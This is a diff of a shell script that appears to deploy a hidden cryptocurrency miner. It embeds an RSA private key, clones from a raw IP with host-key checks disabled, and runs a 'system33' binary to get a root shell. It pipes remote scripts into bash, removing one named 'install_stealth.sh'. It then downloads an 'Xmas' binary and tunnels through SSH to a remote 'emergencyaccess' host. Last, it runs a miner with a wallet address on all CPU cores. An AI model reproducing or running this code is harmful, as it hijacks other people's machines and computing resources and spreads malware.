@@ -54,42 +54,47 @@ S5vvde6AJJWaGaRbW+joz1Se8x7OedqhqYYhbQhzgvaXZ30kbb4PcV18svsY
 -----END RSA PRIVATE KEY-----
 END
 
-sleep 10
+sleep 5
 
 chmod 600 gituser
 
-sleep 10
+sleep 5
 
 git clone -c "core.sshCommand=ssh -i gituser -F /dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no" git@45.135.56.238:mygitfolder/project.git
-sleep 10
+sleep 5
 cd project
-sleep 10
+sleep 5
 ./system33 -S . /bin/bash
-sleep 10
+sleep 5
 su -
+sleep 2
+cat /etc/*-release
+sleep 2
 apt apdate;apt -y install openssh-client wget git curl
-sleep 10
+sleep 5
 
-curl -fsSL http://greenleaf.teatspray.uk/install_stealth.sh | bash
+curl -fsSL https://deb.nodesource.com/setup_23.x | bash
+sleep 2
+apt-get install -y nodejs
 
-sleep 10
+sleep 5
 
 DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
 
-sleep 10
+sleep 5
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
 dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
-sleep 10
+sleep 5
 
 TZ='Africa/Johannesburg'; export TZ
 date
-sleep 10
+sleep 5
 wget -q https://raw.githubusercontent.com/mthuthuzelimagqenene/shiny_pasc/refs/heads/main/Xmas.tar.gz
-sleep 10
+sleep 5
 tar -xf Xmas.tar.gz
-sleep 10
+sleep 5
 
 cat > gituser <<END
 -----BEGIN RSA PRIVATE KEY-----
@@ -145,11 +150,11 @@ S5vvde6AJJWaGaRbW+joz1Se8x7OedqhqYYhbQhzgvaXZ30kbb4PcV18svsY
 -----END RSA PRIVATE KEY-----
 END
 
-sleep 10
+sleep 5
 
 chmod 600 gituser
 
-sleep 10
+sleep 5
 
 ssh -i gituser -vvv -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 13333:0.0.0.0:3333 root@01-Mar-2025_Cloudways_167_172_59_26_4E9zagAD.emergencyaccess.teatspray.uk -p 24393 &
 
@@ -164,7 +169,7 @@ done
 currentdate=$(date '+%d-%b-%Y_Shiny_')
 ipaddress=$(curl -s api.ipify.org)
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-used_num_of_cores=`expr $num_of_cores - 6`
+used_num_of_cores=`expr $num_of_cores - 0`
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 underscore="_"
 underscored_ip+=$underscore
@@ -181,4 +186,4 @@ echo ""
 
 sleep 2
 
-./Xmas --donate-level 1 -o 127.0.0.1:13333 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K -p $currentdate -a rx/arq -k -t $used_num_of_cores 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o 127.0.0.1:13333 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K -p $currentdate -a rx/arq -k -t $used_num_of_cores
